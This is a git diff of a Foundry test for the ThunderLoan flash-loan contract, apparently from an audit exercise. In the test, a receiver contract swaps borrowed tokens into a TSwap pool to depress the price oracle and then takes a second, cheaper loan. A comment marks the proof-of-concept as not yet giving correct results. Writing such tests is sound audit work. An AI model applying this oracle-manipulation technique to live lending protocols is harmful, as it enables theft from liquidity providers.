@@ -154,14 +154,13 @@ contract ThunderLoanTest is BaseTest {
 
         // 2. Set the oracle
         //fund a TESTER
-        uint256 amount = 1000 ether;
+        uint256 amount = 10_000 ether;
         tokenA.mint(tester, amount);
         weth.mint(tester, amount);
 
-        uint256 wethToDep = 1 ether;
-        uint256 wethToDepThunder = 200 ether;
-        uint256 tokenToDepThunder = 300 ether;
-        uint256 tokenToDep = 1 ether;
+        uint256 wethToDep = 100 ether;
+        uint256 tokenToDepThunder = 1000 ether;
+        uint256 tokenToDep = 100 ether;
         // 1 WETH = 1 TOKEN
 
         vm.startPrank(tester);
@@ -170,7 +169,7 @@ contract ThunderLoanTest is BaseTest {
         tokenA.approve(address(thunderLoan), type(uint256).max);
         weth.approve(address(thunderLoan), type(uint256).max);
 
-        tSwap.deposit(wethToDep, 1, tokenToDep, block.timestamp + 1000);
+        tSwap.deposit(wethToDep, 100 ether, tokenToDep, block.timestamp);
         thunderLoan.deposit(tokenA, tokenToDepThunder);
         vm.stopPrank();
 
@@ -180,21 +179,28 @@ contract ThunderLoanTest is BaseTest {
         TestLoanReceiever testLoanReceiever =
             new TestLoanReceiever(thunderLoan, tSwap, address(tokenA), address(weth), address(aToken));
         tokenA.mint(address(testLoanReceiever), 7000 ether);
+
+        uint256 feeBefore = testLoanReceiever.getBeforeFees();
+
         vm.startPrank(address(testLoanReceiever));
         IERC20(tokenA).approve(address(tSwap), type(uint256).max);
-        thunderLoan.flashloan(address(testLoanReceiever), tokenA, 100 ether, "");
+        thunderLoan.flashloan(address(testLoanReceiever), tokenA, 50 ether, "");
         vm.stopPrank();
 
         uint256 attackFee = testLoanReceiever.fee1() + testLoanReceiever.fee2();
         console.log("atackFee", attackFee);
 
-        assert(attackFee < 1 ether);
+        assert(attackFee < feeBefore);
         //298603819985790278
         //518132305114515985
 
         //149774661992989484
         //149803782541046960
+
+        //? why test is not bearing correct results??
     }
+    //296147410319118389
+    //214167600932190305
 }
 
 contract TestLoanReceiever is IFlashLoanReceiver {
@@ -213,8 +219,11 @@ contract TestLoanReceiever is IFlashLoanReceiver {
         tokenA = _tokenA;
         weth = _weth;
         repayAddr = _repayAddr;
+    }
 
+    function getBeforeFees() public returns (uint256) {
         uint256 feeBefore = thunderLoan.getCalculatedFee(IERC20(tokenA), 100 ether);
+        return feeBefore;
         console.log("feeBefore", feeBefore);
     }
 
@@ -235,8 +244,8 @@ contract TestLoanReceiever is IFlashLoanReceiver {
 
             // swap the borrowed funds for WETH tanking the price
             // then takeout another loan and compare the fees
-            uint256 wethAmt = tSwap.getOutputAmountBasedOnInput(100 ether, 1 ether, 1 ether);
-            tSwap.swapPoolTokenForWethBasedOnInputPoolToken(100 ether, wethAmt, block.timestamp);
+            uint256 wethAmt = tSwap.getOutputAmountBasedOnInput(50 ether, 1 ether, 1 ether);
+            tSwap.swapPoolTokenForWethBasedOnInputPoolToken(50 ether, wethAmt, block.timestamp);
 
             thunderLoan.flashloan(address(this), IERC20(token), amount, "");
 
